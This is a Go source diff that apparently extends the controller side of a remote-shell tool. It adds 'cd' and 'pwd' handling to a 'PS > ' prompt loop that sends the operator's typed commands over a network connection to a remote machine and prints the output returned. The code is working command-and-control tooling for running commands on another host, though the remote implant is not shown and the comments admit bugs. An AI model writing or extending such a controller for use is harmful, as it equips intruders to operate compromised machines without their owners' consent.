@@ -6,20 +6,27 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"regexp"
 	"strings"
 	"time"
 )
 
 // Server-Sides needs to handle errors better
-func shell(conn *net.Conn) {
+func shell(conn *net.Conn) { //FIX CD AND PWD HERE TOO
 	reader := bufio.NewReader(os.Stdin)
 L: //Labeled the for loop with L if i need to break it from switch. Faster than if statements. Works.
 	for {
 		fmt.Print("PS > ")
 		command, err := reader.ReadString('\n')
 		if err != nil {
-			fmt.Println("Error reading input:", err)
+			fmt.Println("[-]Error reading input:", err)
 			continue
+		}
+		cdRegex := regexp.MustCompile(`cd .+`)
+		cdRegexComp := cdRegex.FindString(command)
+		if cdRegexComp != "" {
+			dir2Go := strings.Split(command, " ")[1]
+			cd(conn, dir2Go)
 		}
 		switch command {
 		case "\n":
@@ -30,6 +37,8 @@ L: //Labeled the for loop with L if i need to break it from switch. Faster than 
 			break L
 		case "exit\n":
 			break L
+		case "pwd\n":
+			pwd(conn)
 		default:
 			(*conn).Write([]byte(command))
 			request := make([]byte, 9000)
@@ -130,7 +139,31 @@ func ls(conn *net.Conn) {
 
 func cd(conn *net.Conn, dir2go string) { //Test this since I think cd .. is not working
 	(*conn).Write([]byte("cd\n"))
-	(*conn).Write([]byte("cd " + dir2go))
+	buffer := make([]byte, 100)
+	read_len, err := (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of Buffer")
+		return
+	}
+	(*conn).Write([]byte(dir2go))
+	read_len, err = (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of Buffer")
+		return
+	}
+	bufferSnapped := buffer[:read_len]
+	strBuffer := string(bufferSnapped)
+	if strBuffer != "OK\n" {
+		fmt.Println("ERROR")
+	}
 }
 
 func pwd(conn *net.Conn) {
